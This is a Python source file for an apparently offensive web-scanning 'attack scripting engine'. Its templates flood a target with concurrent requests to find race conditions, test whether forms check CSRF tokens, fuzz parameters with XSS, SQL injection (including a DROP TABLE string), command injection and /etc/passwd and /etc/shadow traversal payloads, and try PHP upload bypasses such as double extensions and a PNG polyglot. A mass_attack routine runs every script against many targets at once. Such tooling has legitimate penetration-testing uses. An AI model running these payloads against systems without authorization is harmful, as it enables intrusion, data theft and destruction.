#!/usr/bin/env python3
"""
Python Attack Scripting Engine
Dynamic, Python-based attack script execution with real-time vulnerability detection

Features:
- Real-time payload generation and mutation
- Response analysis hooks for immediate vulnerability detection  
- Chain attack capabilities (find CSRF token → exploit)
- Custom attack templates for common patterns
- Integration with Turbo Engine for high-speed execution
"""

import asyncio
import logging
import time
import re
import json
import random
import string
from typing import Dict, List, Optional, Callable, Any, Union
from dataclasses import dataclass
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from pathlib import Path

from .turbo_engine import TurboEngine, TurboRequest, TurboResponse
from asset_manager import VulnerabilityFinding

logger = logging.getLogger("AttackScripts")

@dataclass
class AttackResult:
    """Result from an attack script execution"""
    script_name: str
    target_url: str
    vulnerabilities_found: List[VulnerabilityFinding]
    execution_time: float
    requests_sent: int
    success: bool
    error_message: Optional[str] = None
    additional_data: Dict[str, Any] = None

class AttackScriptEngine:
    """Python-based attack scripting engine"""
    
    def __init__(self, turbo_engine: TurboEngine):
        self.turbo_engine = turbo_engine
        self.script_templates = {}
        self.global_variables = {}
        self.response_analyzers = []
        self.vulnerability_callbacks = []
        
        # Load built-in templates
        self._load_builtin_templates()
    
    def _load_builtin_templates(self):
        """Load built-in attack script templates"""
        
        # Race Condition Template
        self.script_templates['race_condition'] = """
# Race Condition Attack Template
async def attack(engine, target_url, params=None):
    '''Race condition testing for concurrent operations'''
    
    # Extract parameters
    concurrent_requests = params.get('concurrent_requests', 50)
    gate_name = params.get('gate_name', 'race_gate')
    payload_data = params.get('payload_data', {})
    
    vulnerabilities = []
    
    # Create gate for synchronization
    gate = engine.create_gate(gate_name)
    
    # Generate concurrent requests
    requests = []
    for i in range(concurrent_requests):
        req = TurboRequest(
            method='POST',
            url=target_url,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            data=payload_data,
            gate=gate_name,
            id=f'race_req_{i}'
        )
        engine.queue_request(req)
        requests.append(req)
    
    # Execute race condition test
    responses = await engine.race_condition_test(gate_name)
    
    # Analyze responses for race condition indicators
    status_codes = [r.status for r in responses]
    unique_statuses = set(status_codes)
    
    if len(unique_statuses) > 1:
        # Different status codes = potential race condition
        finding = VulnerabilityFinding(
            url=target_url,
            vuln_type="RACE_CONDITION",
            severity="High",
            confidence=0.85,
            payload=f"Concurrent requests: {concurrent_requests}",
            evidence=f"Race condition detected: {len(unique_statuses)} different status codes: {unique_statuses}",
            discovered_at=datetime.now(),
            impact_description="Race condition allows bypassing business logic controls",
            remediation="Implement proper locking mechanisms and atomic operations"
        )
        vulnerabilities.append(finding)
    
    return {
        'vulnerabilities': vulnerabilities,
        'requests_sent': len(requests),
        'responses_received': len(responses),
        'status_distribution': {code: status_codes.count(code) for code in unique_statuses}
    }
"""

        # CSRF Token Chain Template
        self.script_templates['csrf_chain'] = """
# CSRF Token Chain Attack Template  
async def attack(engine, target_url, params=None):
    '''Multi-step CSRF token extraction and exploitation'''
    
    vulnerabilities = []
    requests_sent = 0
    
    # Step 1: Get the form page and extract CSRF token
    form_req = TurboRequest(method='GET', url=target_url)
    form_resp = await engine.send_request(form_req)
    requests_sent += 1
    
    # Extract CSRF token
    csrf_token = None
    csrf_patterns = [
        r'name=["\']csrf[_-]?token["\']\\s+value=["\']([^"\']+)["\']',
        r'name=["\']_token["\']\\s+value=["\']([^"\']+)["\']',
        r'<input[^>]*name=["\']csrf["\'][^>]*value=["\']([^"\']+)["\']'
    ]
    
    for pattern in csrf_patterns:
        match = re.search(pattern, form_resp.text, re.IGNORECASE)
        if match:
            csrf_token = match.group(1)
            break
    
    # Step 2: Test CSRF vulnerability
    if csrf_token:
        # Test with valid token (should work)
        valid_data = params.get('form_data', {})
        valid_data['csrf_token'] = csrf_token
        
        valid_req = TurboRequest(
            method='POST',
            url=target_url,
            data=valid_data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        valid_resp = await engine.send_request(valid_req)
        requests_sent += 1
        
        # Test without token (CSRF vulnerable if this works)
        invalid_data = {k: v for k, v in valid_data.items() if 'csrf' not in k.lower()}
        
        invalid_req = TurboRequest(
            method='POST', 
            url=target_url,
            data=invalid_data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        invalid_resp = await engine.send_request(invalid_req)
        requests_sent += 1
        
        # Check if request succeeded without CSRF token
        if invalid_resp.status == 200 and 'error' not in invalid_resp.text.lower():
            finding = VulnerabilityFinding(
                url=target_url,
                vuln_type="CSRF",
                severity="High",
                confidence=0.90,
                payload=f"Form submission without CSRF token",
                evidence=f"CSRF token found but not validated. Request succeeded without token. Response: {invalid_resp.text[:200]}",
                discovered_at=datetime.now(),
                impact_description="CSRF vulnerability allows attackers to perform actions on behalf of users",
                remediation="Implement proper CSRF token validation on server side"
            )
            vulnerabilities.append(finding)
    
    else:
        # No CSRF token found = definitely vulnerable
        finding = VulnerabilityFinding(
            url=target_url,
            vuln_type="CSRF",
            severity="High", 
            confidence=0.95,
            payload="No CSRF protection detected",
            evidence=f"No CSRF token found in form. Page content: {form_resp.text[:300]}",
            discovered_at=datetime.now(),
            impact_description="Missing CSRF protection allows cross-site request forgery attacks",
            remediation="Implement CSRF tokens in all state-changing forms"
        )
        vulnerabilities.append(finding)
    
    return {
        'vulnerabilities': vulnerabilities,
        'requests_sent': requests_sent,
        'csrf_token_found': csrf_token is not None,
        'csrf_token': csrf_token
    }
"""

        # Parameter Fuzzing Template
        self.script_templates['param_fuzzing'] = """
# Advanced Parameter Fuzzing Template
async def attack(engine, target_url, params=None):
    '''High-speed parameter fuzzing with multiple payload types'''
    
    vulnerabilities = []
    requests_sent = 0
    
    # Parse URL and extract existing parameters
    from urllib.parse import urlparse, parse_qs
    parsed = urlparse(target_url)
    base_params = parse_qs(parsed.query, keep_blank_values=True)
    
    # Fuzzing payloads by category
    payloads = {
        'xss': [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>'
        ],
        'sqli': [
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "admin'--"
        ],
        'cmd_injection': [
            '; whoami',
            '| whoami',  
            '&& whoami',
            '`whoami`',
            '; cat /etc/passwd'
        ],
        'lfi': [
            '../../../etc/passwd',
            '..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
            '/etc/shadow',
            '....//....//....//etc/passwd',
            '/proc/version'
        ]
    }
    
    # Test each parameter with each payload type
    for param_name in list(base_params.keys()) + ['test_param']:
        for payload_type, payload_list in payloads.items():
            for payload in payload_list:
                
                # Create test parameters
                test_params = base_params.copy()
                test_params[param_name] = [payload]
                
                # Build test URL
                from urllib.parse import urlencode, urlunparse
                query_string = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, query_string, parsed.fragment
                ))
                
                # Send request
                req = TurboRequest(method='GET', url=test_url)
                resp = await engine.send_request(req)
                requests_sent += 1
                
                # Analyze response for vulnerabilities
                confidence = 0.0
                evidence = ""
                
                if payload_type == 'xss':
                    if payload in resp.text:
                        confidence = 0.95
                        evidence = f"XSS payload reflected unescaped: {payload}"
                    elif any(keyword in resp.text.lower() for keyword in ['alert', 'script', 'javascript']):
                        confidence = 0.75  
                        evidence = f"Partial XSS reflection detected"
                
                elif payload_type == 'sqli':
                    sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'microsoft ole db', 'postgresql']
                    if any(error in resp.text.lower() for error in sql_errors):
                        confidence = 0.90
                        evidence = f"SQL error detected with payload: {payload}"
                
                elif payload_type == 'cmd_injection':
                    cmd_indicators = ['uid=', 'gid=', '/bin/', 'root:', 'www-data']
                    if any(indicator in resp.text.lower() for indicator in cmd_indicators):
                        confidence = 0.95
                        evidence = f"Command execution output detected: {resp.text[:200]}"
                
                elif payload_type == 'lfi':
                    lfi_indicators = ['root:x:0:0:', 'daemon:x:1:1:', '[drivers]', 'Linux version']
                    if any(indicator in resp.text for indicator in lfi_indicators):
                        confidence = 0.90
                        evidence = f"Local file inclusion successful: {payload}"
                
                # Create vulnerability finding if confident
                if confidence >= 0.75:
                    finding = VulnerabilityFinding(
                        url=test_url,
                        vuln_type=payload_type.upper(),
                        severity="Critical" if payload_type in ['sqli', 'cmd_injection'] else "High",
                        confidence=confidence,
                        payload=payload,
                        evidence=evidence,
                        discovered_at=datetime.now(),
                        impact_description=f"{payload_type.upper()} vulnerability in {param_name} parameter",
                        affected_parameter=param_name,
                        remediation=f"Implement proper input validation for {payload_type} attacks"
                    )
                    vulnerabilities.append(finding)
                
                # Rate limiting
                await asyncio.sleep(0.01)  # 10ms delay between requests
    
    return {
        'vulnerabilities': vulnerabilities,
        'requests_sent': requests_sent,
        'parameters_tested': len(base_params) + 1,
        'payloads_per_param': sum(len(pl) for pl in payloads.values())
    }
"""

        # File Upload Bypass Template  
        self.script_templates['upload_bypass'] = """
# File Upload Bypass Testing Template
async def attack(engine, target_url, params=None):
    '''Advanced file upload bypass testing'''
    
    vulnerabilities = []
    requests_sent = 0
    
    # File upload payloads with different bypass techniques
    bypass_techniques = [
        {
            'name': 'PHP direct upload',
            'filename': 'shell.php',
            'content': '<?php echo "UPLOAD_SUCCESS"; ?>',
            'content_type': 'application/x-php'
        },
        {
            'name': 'Content-Type bypass',
            'filename': 'shell.php', 
            'content': '<?php echo "UPLOAD_SUCCESS"; ?>',
            'content_type': 'image/jpeg'
        },
        {
            'name': 'Double extension',
            'filename': 'shell.php.jpg',
            'content': '<?php echo "UPLOAD_SUCCESS"; ?>',
            'content_type': 'image/jpeg'
        },
        {
            'name': 'Case manipulation',
            'filename': 'shell.PhP',
            'content': '<?php echo "UPLOAD_SUCCESS"; ?>',
            'content_type': 'text/plain'
        },
        {
            'name': 'PNG polyglot',
            'filename': 'shell.png',
            'content': b'\\x89PNG\\r\\n\\x1a\\n<?php echo "UPLOAD_SUCCESS"; ?>',
            'content_type': 'image/png'
        }
    ]
    
    for technique in bypass_techniques:
        try:
            # Prepare multipart form data
            import aiohttp
            form_data = aiohttp.FormData()
            form_data.add_field('uploaded', 
                              technique['content'], 
                              filename=technique['filename'],
                              content_type=technique['content_type'])
            
            # Send upload request
            req = TurboRequest(
                method='POST',
                url=target_url,
                data=form_data
            )
            resp = await engine.send_request(req)
            requests_sent += 1
            
            # Check for upload success indicators
            success_indicators = [
                'successfully uploaded', 'upload successful', 'file uploaded',
                technique['filename'], 'saved', 'stored'
            ]
            
            upload_success = any(indicator in resp.text.lower() for indicator in success_indicators)
            
            if upload_success:
                finding = VulnerabilityFinding(
                    url=target_url,
                    vuln_type="FILE_UPLOAD",
                    severity="Critical",
                    confidence=0.90,
                    payload=f"{technique['name']}: {technique['filename']}",
                    evidence=f"File upload bypass successful - {technique['name']}. Response: {resp.text[:200]}",
                    discovered_at=datetime.now(),
                    impact_description=f"File upload bypass via {technique['name']} enables arbitrary code execution",
                    remediation="Implement strict file validation: extension whitelist, content verification, virus scanning"
                )
                vulnerabilities.append(finding)
                
                # Try to access uploaded file for verification
                potential_paths = [
                    f"/uploads/{technique['filename']}",
                    f"/files/{technique['filename']}",  
                    f"/media/{technique['filename']}",
                    f"/{technique['filename']}"
                ]
                
                for path in potential_paths:
                    verify_url = f"{target_url.rstrip('/')}{path}"
                    verify_req = TurboRequest(method='GET', url=verify_url)
                    verify_resp = await engine.send_request(verify_req)
                    requests_sent += 1
                    
                    if 'UPLOAD_SUCCESS' in verify_resp.text:
                        finding.evidence += f" | File accessible at: {verify_url}"
                        finding.confidence = 0.95
                        break
        
        except Exception as e:
            logger.debug(f"Upload test failed for {technique['name']}: {e}")
    
    return {
        'vulnerabilities': vulnerabilities,
        'requests_sent': requests_sent,
        'techniques_tested': len(bypass_techniques)
    }
"""
    
    async def execute_script(self, script_name: str, target_url: str, params: Dict[str, Any] = None) -> AttackResult:
        """Execute an attack script by name"""
        start_time = time.time()
        
        if script_name not in self.script_templates:
            return AttackResult(
                script_name=script_name,
                target_url=target_url,
                vulnerabilities_found=[],
                execution_time=0,
                requests_sent=0,
                success=False,
                error_message=f"Script '{script_name}' not found"
            )
        
        try:
            # Import required modules into script namespace
            script_globals = {
                'TurboRequest': TurboRequest,
                'TurboResponse': TurboResponse,
                'VulnerabilityFinding': VulnerabilityFinding,
                'datetime': datetime,
                'asyncio': asyncio,
                're': re,
                'json': json,
                'time': time,
                'logger': logger,
                **self.global_variables
            }
            
            # Execute script template
            exec(self.script_templates[script_name], script_globals)
            attack_func = script_globals['attack']
            
            # Run the attack function
            result = await attack_func(self.turbo_engine, target_url, params or {})
            
            execution_time = time.time() - start_time
            
            # Process vulnerabilities through callbacks
            vulnerabilities = result.get('vulnerabilities', [])
            for callback in self.vulnerability_callbacks:
                for vuln in vulnerabilities:
                    await callback(vuln)
            
            return AttackResult(
                script_name=script_name,
                target_url=target_url,
                vulnerabilities_found=vulnerabilities,
                execution_time=execution_time,
                requests_sent=result.get('requests_sent', 0),
                success=True,
                additional_data=result
            )
            
        except Exception as e:
            logger.error(f"Script execution failed: {e}")
            return AttackResult(
                script_name=script_name,
                target_url=target_url,
                vulnerabilities_found=[],
                execution_time=time.time() - start_time,
                requests_sent=0,
                success=False,
                error_message=str(e)
            )
    
    def add_script_template(self, name: str, script_code: str):
        """Add a custom script template"""
        self.script_templates[name] = script_code
        logger.info(f"Added script template: {name}")
    
    def add_global_variable(self, name: str, value: Any):
        """Add a global variable accessible to all scripts"""
        self.global_variables[name] = value
    
    def add_vulnerability_callback(self, callback: Callable):
        """Add a callback to process found vulnerabilities"""
        self.vulnerability_callbacks.append(callback)
    
    def list_available_scripts(self) -> List[str]:
        """Get list of available script templates"""
        return list(self.script_templates.keys())
    
    async def mass_attack(self, target_urls: List[str], script_names: List[str], params: Dict[str, Any] = None) -> List[AttackResult]:
        """Execute multiple attack scripts against multiple targets"""
        logger.info(f"🚀 Starting mass attack: {len(target_urls)} targets, {len(script_names)} scripts")
        
        tasks = []
        for url in target_urls:
            for script in script_names:
                tasks.append(self.execute_script(script, url, params))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Filter successful results
        successful_results = [r for r in results if isinstance(r, AttackResult) and r.success]
        total_vulnerabilities = sum(len(r.vulnerabilities_found) for r in successful_results)
        
        logger.info(f"🏁 Mass attack complete: {len(successful_results)} successful executions, {total_vulnerabilities} vulnerabilities found")
        
        return results